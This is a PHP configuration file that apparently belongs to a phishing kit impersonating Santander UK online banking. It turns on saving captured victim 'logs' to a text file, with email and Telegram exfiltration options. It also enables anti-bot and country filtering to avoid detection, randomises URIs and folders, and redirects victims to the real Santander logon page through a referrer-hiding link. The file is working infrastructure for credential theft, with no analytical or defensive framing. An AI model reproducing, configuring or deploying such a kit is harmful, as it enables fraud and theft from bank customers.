<?php
error_reporting(0);
ob_start();
    session_start();
    $directory = __DIR__;

    //Online
    $online = 1;

    // Site Name
    $site_name = 'Sant';

    // Timezone
    date_default_timezone_set('Europe/London');
 
    //Save Logs to TXT
    $save_to_txt = 1;
    $txt_fileName = 'filexna.txt';
    
    //Save Logs to Email
    $save_to_mail = 0;
    $email = '123@gmail.com';

    //Save Logs to Telegram
    $save_to_telegram = 0;
    $token = '';
    $chat_id = ''; 

    //AntiBot
    $antibot = 1; 

    //OneTime
    $onetime = 0;

    //Filter by country
    $accept_by_countries = 0;
    $accept_countries = array('UK','GB','FR','CH','NL');

    //Filter by device
    $accept_device = 'All'; // All/Mob/PC

    //Generate random folder for each visitor
    $random_folder = 0;

    //Parameter Check
    $parametercheck = 1;
    $parameter = 'uids';
    
    //Random URI
    $random_uri = 1;

    //Exit Link
    $exitlink = 'https://href.li/?https://retail.santander.co.uk/olb/app/logon/access/#/logon';    
ob_end_flush();
?>